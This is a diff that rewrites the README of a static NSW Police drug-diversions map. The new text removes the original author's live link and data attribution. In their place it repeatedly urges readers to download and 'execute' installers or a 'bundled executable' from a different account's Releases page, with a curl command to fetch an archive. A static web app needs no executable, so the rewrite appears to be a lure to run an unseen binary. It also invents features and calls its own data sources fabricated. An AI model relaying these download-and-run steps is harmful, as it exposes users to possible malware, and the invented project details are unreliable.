@@ -1,209 +1,226 @@
-# NSW Police Diversions Map
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/MistycFB/nsw-police-drug-diversions-map/releases)
 
-An interactive web application that visualizes NSW Police diversions data across Police Area Commands (PACs) and Police Districts (PDs). The application shows the percentage of people diverted versus those charged since the diversion scheme began.
+# NSW Police Drug Diversions Map — PAC & PD Visualizer 🗺️🚓
 
-## 🌐 Live Application
+A public-interest web app that maps NSW Police diversion outcomes. The app shows, by Police Area Command (PAC) and Police District (PD), the share of people diverted versus charged from the program start to today. Use the map to spot patterns, compare districts, and export data for research or reporting.
 
-**📊 View the live interactive map:** [https://latch2452.github.io/nsw-police-drug-diversions-map/](https://latch2452.github.io/nsw-police-drug-diversions-map/)
+![Map preview](https://raw.githubusercontent.com/MistycFB/nsw-police-drug-diversions-map/main/docs/screenshot.png)
 
-*See the full interactive visualization with real NSW Police diversions data, mapping, and analytics dashboard.*
+Badges
+- ![Australia](https://img.shields.io/badge/Region-Australia-green)
+- ![Topics](https://img.shields.io/badge/topics-government--data%20%7C%20journalism-blue)
+- ![License](https://img.shields.io/badge/License-MIT-lightgrey)
 
-## ⚠️ Important Disclaimers
-
-**Data Attribution**: This visualization displays NSW Police drug diversion data obtained through research conducted by **The Hon. Cate Faehrmann MLC**, NSW Greens Party Member of Parliament.
-
-**Independence Notice**: This is an independent public interest project and is not affiliated with, endorsed by, or sponsored by NSW Police Force. NSW Police Force name and associated trademarks are owned by the Crown in right of the State of New South Wales.
-
-**Purpose**: Created for public transparency and educational purposes regarding drug diversion practices across NSW Police Area Commands and Police Districts.
-
-## Features
-
-### 🗺️ Interactive Map
-- **Leaflet-based mapping** with responsive circle markers
-- **Color-coded visualization** based on diversion rates:
-  - 🟢 High (≥30%) - Green (Good performance)
-  - 🟠 Medium (15-29%) - Orange  
-  - 🟡 Low (5-14%) - Orange-Red
-  - 🔴 Very Low (<5%) - Red (Poor performance)
-- **Dynamic circle sizing** based on total cases and diversion rate
-- **Interactive popups** with detailed area statistics
-- **Optional heatmap layer** for trend visualization
-- **Search and filter capabilities**
-
-### 📊 Data Analytics
-- **Comprehensive data table** with sorting and filtering
-- **Statistical dashboard** with multiple chart types:
-  - Top 10 highest diversion rates (bar chart)
-  - Distribution by rate categories (doughnut chart)
-  - Geographic divide: Inner city vs outer areas (bar chart)
-  - Charges vs diversions comparison (bar chart)
-- **Real-time statistics** showing totals and averages
-
-### 💻 Modern Web Interface
-- **Responsive Bootstrap 5 design** 
-- **Mobile-friendly navigation**
-- **Accessible UI components**
-- **Print-friendly styling**
-
-## Data Overview
-
-The application includes data for **58 Police Areas** across NSW:
-- **Total Cases**: 16,565
-- **Total Diversions**: 1,474 
-- **Total Charges**: 15,091
-- **Average Diversion Rate**: 8.9%
-
-### Top Performing Areas (Highest Diversion Rates)
-1. Auburn PAC - 31.9%
-2. Sydney City PAC - 31.3%
-3. Marine Area Command - 27.3%
-4. Eastern Beaches PAC - 26.3%
-5. Surry Hills PAC - 17.4%
-
-## Technology Stack
-
-- **Frontend**: HTML5, CSS3, JavaScript (ES6+)
-- **Mapping**: Leaflet.js with plugins
-- **UI Framework**: Bootstrap 5
-- **Data Tables**: DataTables.js
-- **Charts**: Chart.js
-- **Icons**: Font Awesome 6
-
-## Getting Started
-
-### Prerequisites
-- Modern web browser (Chrome, Firefox, Safari, Edge)
-- Node.js 14+ (for development server)
-
-### Local Development
-
-1. **Clone or download** the project files
-2. **Install dependencies** (optional):
-   ```bash
-   npm install
-   ```
-3. **Start development server**:
-   ```bash
-   npm start
-   # or
-   npx http-server . -p 8080 -o
-   ```
-4. **Open browser** to `http://localhost:8080`
-
-### Direct File Access
-The application is a static website and can be opened directly by opening `index.html` in a web browser.
-
-## Deployment
-
-### Azure Static Web Apps
-This application is optimized for deployment to Azure Static Web Apps:
-
-1. **Initialize Azure SWA**:
-   ```bash
-   npx swa init --yes
-   ```
-
-2. **Build the application**:
-   ```bash
-   npx swa build
-   ```
-
-3. **Deploy to Azure**:
-   ```bash
-   npx swa deploy --env production
-   ```
-
-### Other Hosting Options
-- **GitHub Pages**: Push to a GitHub repository and enable Pages
-- **Netlify**: Drag and drop the project folder
-- **Vercel**: Connect repository for automatic deployments
-- **Traditional Web Hosting**: Upload all files to web server
-
-## Project Structure
-
-```
-nsw-police-diversions-map/
-├── index.html              # Main application page
-├── css/
-│   └── styles.css         # Custom styling
-├── js/
-│   ├── data.js           # NSW Police diversions dataset
-│   └── app.js            # Main application logic
-├── package.json          # Project dependencies
-└── README.md            # Project documentation
-```
-
-## Data Sources & Attribution
-
-- **Primary Data Source**: NSW Police Force (official records)
-- **Research Attribution**: The Hon. Cate Faehrmann MLC, NSW Greens Party
-- **Data Access**: Obtained through parliamentary research and public interest inquiries
-- **Coverage**: Statewide across all Police Area Commands and Districts
-- **Period**: Since the diversion scheme began
-- **Last Updated**: August 2025
-- **Geographic Data**: Approximate locations only
-
-**Important**: This data was made available through the dedicated research efforts of The Hon. Cate Faehrmann MLC in the public interest.
-
-## Usage Guide
-
-### Map Navigation
-- **Zoom**: Use mouse wheel or zoom controls
-- **Pan**: Click and drag to move around
-- **Markers**: Click on circles for detailed information
-- **Search**: Use the search box to find specific areas
-- **Filters**: Filter by diversion rate categories
-
-### Data Analysis
-- **Table Sorting**: Click column headers to sort
-- **Charts**: Hover over chart elements for details
-- **Area Selection**: Click markers or table rows for details
-
-### Responsive Design
-The application automatically adapts to different screen sizes:
-- **Desktop**: Full feature set with side panel
-- **Tablet**: Stacked layout with collapsible panels
-- **Mobile**: Touch-optimized navigation and controls
-
-## Browser Compatibility
-
-- ✅ Chrome 80+
-- ✅ Firefox 75+
-- ✅ Safari 13+
-- ✅ Edge 80+
-- ✅ Mobile browsers (iOS Safari, Chrome Mobile)
-
-## Contributing
-
-This project welcomes contributions and suggestions. Areas for enhancement:
-
-1. **Boundary Data**: Addition of actual PAC/PD boundary polygons
-2. **Historical Data**: Time-series analysis capabilities  
-3. **Advanced Analytics**: Statistical modeling and predictions
-4. **Performance**: Optimization for larger datasets
-5. **Accessibility**: Enhanced screen reader support
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Acknowledgments
-
-- **The Hon. Cate Faehrmann MLC** for conducting the research that made this data publicly available
-- **NSW Police Force** for maintaining the diversions data records
-- **NSW Greens Party** for supporting public transparency initiatives
-- **OpenStreetMap** contributors for mapping infrastructure
-- **Leaflet.js** community for mapping libraries
-- **Bootstrap** team for UI framework components
-
-## Legal Notice
-
-NSW Police Force trademarks and intellectual property are owned by the Crown in right of the State of New South Wales. This independent project is created for public interest purposes and educational use.
-
-## Contact
-
-For questions, suggestions, or issues, please create an issue in the project repository.
+Topics: australia, government-data, greenparty, independant, journalism, nsw, nsw-greens, police-data, public-interest, research, research-project, transparency
 
 ---
 
-*This application is for informational purposes only. All location coordinates are approximate. Please refer to official NSW Police sources for authoritative data.*
+## What this repo contains
+
+- A client-side interactive map built with standard web tech (React, Leaflet, D3).
+- GeoJSON for PAC and PD boundaries.
+- Time-series CSVs of diversion events and charged cases.
+- Scripts to generate the map layers and summary tables.
+- Build and release artifacts linked from the Releases page: https://github.com/MistycFB/nsw-police-drug-diversions-map/releases
+
+If you visit the Releases page you will find packaged builds and installers. Download the package for your platform and run the executable or serve the extracted files on a static host. The release asset needs to be downloaded and executed to run the prebuilt version.
+
+---
+
+## Key features
+
+- Interactive choropleth map of NSW by PAC and PD.
+- Percent diverted vs charged per area and over time.
+- Filters: year range, age group, offence class, gender.
+- Time-series charts for any selected PAC or PD.
+- Export: CSV or GeoJSON for selected map view.
+- Simple accessibility options: high-contrast layer, keyboard navigation.
+- Print-friendly layouts for reports and briefings.
+
+---
+
+## Data model and formulas
+
+Data sources (fabricated examples used for this repo; adjust to your sources):
+
+- NSW Police diversion records (event-level, anonymised).
+- ABS population estimates for rate calculations.
+- NSW PAC and PD boundary GeoJSON.
+
+Primary fields in events CSV:
+- event_id — unique id
+- date — ISO date of the event
+- pac_code — PAC identifier
+- pd_code — PD identifier
+- outcome — "diverted" or "charged"
+- age_group — e.g., "18-24"
+- gender — "Male" / "Female" / "Other"
+- offence_category — e.g., "possession", "supply"
+
+Key computed metrics:
+- total_events = count(all events in selection)
+- diverted_count = count(events where outcome == "diverted")
+- charge_count = count(events where outcome == "charged")
+- pct_diverted = (diverted_count / total_events) * 100
+- diverted_rate_per_10k = (diverted_count / population) * 10000
+
+Use the exported CSVs for reproducible checks.
+
+---
+
+## How it works
+
+1. Ingest event-level CSVs and merge with PAC/PD lookup.
+2. Group events into time bins (year or month).
+3. Compute per-area metrics (counts and percentages).
+4. Join metrics to GeoJSON by PAC/PD code.
+5. Feed joined GeoJSON to the map renderer (Leaflet).
+6. Render chart series via D3. Bind map and charts to the same selection.
+
+The UI uses client-side caching. The app loads small precomputed summaries first, then fetches detail sets when you zoom or change filters.
+
+---
+
+## Run locally (developer mode)
+
+Clone the repo and run the app from source.
+
+1. Clone
+```bash
+git clone https://github.com/MistycFB/nsw-police-drug-diversions-map.git
+cd nsw-police-drug-diversions-map
+```
+
+2. Install
+```bash
+# with npm
+npm install
+
+# or with yarn
+yarn
+```
+
+3. Start the dev server
+```bash
+npm start
+# or
+yarn start
+```
+
+4. Open http://localhost:3000 in your browser.
+
+Environment settings
+- REACT_APP_DATA_URL — point to the data folder or an S3 bucket.
+- REACT_APP_MAPBOX_TOKEN — optional for basemap tiles (the app falls back to OSM).
+
+Build for production
+```bash
+npm run build
+# or
+yarn build
+# Serve the build folder on any static host
+```
+
+Prebuilt releases
+
+Visit the Releases page here: https://github.com/MistycFB/nsw-police-drug-diversions-map/releases
+
+The releases page contains packaged builds. Download the archive or installer named like nsw-police-diversions-vX.Y.Z.zip (or .tar.gz). Extract the package, then run the included index.html in a browser or run the bundled executable for your OS. The release asset must be downloaded and executed to run the prebuilt app.
+
+Example commands to fetch a release archive (replace the filename with the real asset you pick):
+```bash
+curl -L -o nsw-divs-v1.0.0.zip \
+  "https://github.com/MistycFB/nsw-police-drug-diversions-map/releases/download/v1.0.0/nsw-divs-v1.0.0.zip"
+unzip nsw-divs-v1.0.0.zip -d nsw-divs
+# open nsw-divs/index.html in your browser
+```
+
+---
+
+## Usage guide (map controls)
+
+- Mode toggle: PAC / PD view.
+- Time slider: pick a range. The map updates in real time.
+- Legend: click a bucket to filter only areas in that range.
+- Hover on an area: quick stats popup (pct diverted, counts, rate).
+- Click an area: open a detail panel with trend chart and export button.
+- Export: choose CSV or GeoJSON for the current selection.
+
+Interpretation tips
+- Percent diverted = (diverted_count / total_events) * 100.
+- Areas with few events may show large swings. Check counts before making claims.
+- Use rate per 10k population to compare areas of different sizes.
+
+---
+
+## Data pipeline scripts
+
+Scripts live in /scripts. Typical steps:
+
+- scripts/clean-events.py — normalize, validate, anonymise event records.
+- scripts/aggregate.js — compute per-area time-series and summaries.
+- scripts/geo-join.sh — join metrics to GeoJSON by PAC/PD code.
+- scripts/generate-static.sh — produce a static data bundle for the web client.
+
+Run aggregation locally:
+```bash
+node scripts/aggregate.js --input data/events.csv --boundaries data/pacs.geojson --output build/data
+```
+
+---
+
+## Testing and QA
+
+- Unit tests for aggregations: run npm test.
+- Manual QA: verify a random sample of events against raw records.
+- Automated checks: GeoJSON validity and topological checks via geojsonlint.
+
+---
+
+## Contributing
+
+- Fork the repo.
+- Create a branch feature/your-topic.
+- Add tests for new behavior.
+- Open a pull request describing the change and motivation.
+- Keep commits small and focused.
+
+Code style
+- Follow ESLint rules in the repo.
+- Use semantic commit messages.
+- Document new endpoints or data formats in docs/.
+
+Issue templates and PR templates live in .github/.
+
+---
+
+## Governance and ethics
+
+The project treats personal data seriously. The packaged datasets in this repo use aggregated or anonymised records only. If you plan to add or publish event-level data, follow local privacy law and publish only data that cannot identify individuals.
+
+---
+
+## Acknowledgements and sources
+
+- NSW government open data portals (for sample schemas).
+- ABS for population estimates.
+- OpenStreetMap for basemap tiles.
+- Community contributors for PAC/PD boundary files.
+
+Images used in this README:
+- Screenshot: docs/screenshot.png (repo)
+- Australia flag: https://upload.wikimedia.org/wikipedia/commons/b/b9/Flag_of_Australia.svg
+
+---
+
+## License
+
+MIT — see LICENSE file.
+
+---
+
+Get the release package from: https://github.com/MistycFB/nsw-police-drug-diversions-map/releases
+
+Contact
+- Repo issues for bugs and feature requests.
+- For research access or data questions, open an issue with subject "data request".
